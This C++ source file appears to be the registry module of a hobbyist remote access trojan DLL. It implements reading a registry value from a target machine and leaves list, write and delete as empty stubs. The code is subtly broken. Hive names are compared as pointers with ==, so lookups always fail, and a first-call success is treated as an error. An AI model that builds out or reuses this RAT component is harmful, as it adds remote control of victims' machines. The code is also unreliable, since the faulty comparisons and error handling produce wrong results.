// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-RegRead.cpp : Defines functionality for performing a registry read on target, i.e., given a registry key and value name get the value

#include "RAT-Dll-Registry.h"
#include "RAT-Dll-Connect.h"


/** This function will perform a registry key read for us 
params:
* hiveKey - buffer containing hive key our target key resides in 
* subKey - subkey path to our actual desired key 
* valueName - name of the value we're reading from this key 
* regValue - void buffer to contain contents of our reg key 
* sizeRegValue - size of the regValue buffer 
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performRegRead(__in char* hiveKey, __in char* subKey, __in char* valueName, __out void** regValue, __out DWORD* sizeRegValue)
{
	INT status = SUCCESS;
	HKEY hiveKeyValue = NULL, openRegKey = { 0 };
	CHAR msgBuf[DEFAULT_BUF_LEN];

	hiveKeyValue = getHiveKey(hiveKey);
	if (hiveKeyValue == NULL)
	{
		OutputDebugStringA("RAT-Dll-Registry::performRegRead - Invalid hive key passed!\n");
		status = FAILURE;
		goto cleanup;
	}

	status = RegOpenKeyExA(hiveKeyValue, subKey, 0, KEY_READ, &openRegKey);
	if (status != ERROR_SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegOpenKeyExA %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}
	
	status = RegGetValueA(openRegKey, NULL, valueName, RRF_RT_ANY, NULL, *regValue, sizeRegValue);
	if (status == ERROR_MORE_DATA)
	{
		// We anticipate failure here so we can allocate bytes for our buffer as needed
		*regValue = malloc(*sizeRegValue);
		if (*regValue == NULL)
		{
			OutputDebugStringA("RAT-Dll-Registry::performRegRead - Could not allocate enough memory!\n");
			status = FAILURE;
			goto cleanup;
		}

		status = RegGetValueA(openRegKey, NULL, valueName, RRF_RT_ANY, NULL, *regValue, sizeRegValue);
		if (status != ERROR_SUCCESS)
		{
			sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegGetValueA %d\n", status);
			OutputDebugStringA(msgBuf);
			goto cleanup;
		}
	}
	
	// Yikes we got an unexpected error; bail
	else
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegGetValueA %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}

	status = RegCloseKey(openRegKey);
	if (status != ERROR_SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-Registry::performRegRead - Failure recevied from RegCloseKey %d\n", status);
		OutputDebugStringA(msgBuf);
		goto cleanup;
	}


cleanup:
	return status;
}

INT performRegList()
{
	INT status = SUCCESS;


cleanup: 
	return status;
}


INT performRegWrite()
{
	INT status = SUCCESS;


cleanup:
	return status;
}



INT performRegDelete()
{
	INT status = SUCCESS;



cleanup:
	return status;
}


/** Translates user passed hive key to actual value
params:
* hiveKey - buffer containing user desired hive key 
return:
* HKEY value of the hivekey; NULL otherwise 
*/
HKEY getHiveKey(__in char* hiveKey)
{
	if (hiveKey == "HKEY_LOCAL_MACHINE" || hiveKey == "HKLM")
	{
		return HKEY_LOCAL_MACHINE;
	}

	else if (hiveKey == "HKEY_CLASSES_ROOT" || hiveKey == "HKCR")
	{
		return HKEY_CLASSES_ROOT;
	}

	else if (hiveKey == "HKEY_CURRENT_USER" || hiveKey == "HKCU")
	{
		return HKEY_CURRENT_USER;
	}

	else if (hiveKey == "HKEY_USERS" || hiveKey == "HKU")
	{
		return HKEY_USERS;
	}

	else if (hiveKey == "HKEY_CURRENT_CONFIG" || hiveKey == "HKCC")
	{
		return HKEY_CURRENT_CONFIG;
	}

	// Dont care about performance stuff for now
	else
	{
		OutputDebugStringA("RAT-Dll-Registry::getHiveKey - Uncrecognized or unsupported hive key!\n");
		return NULL;
	}
}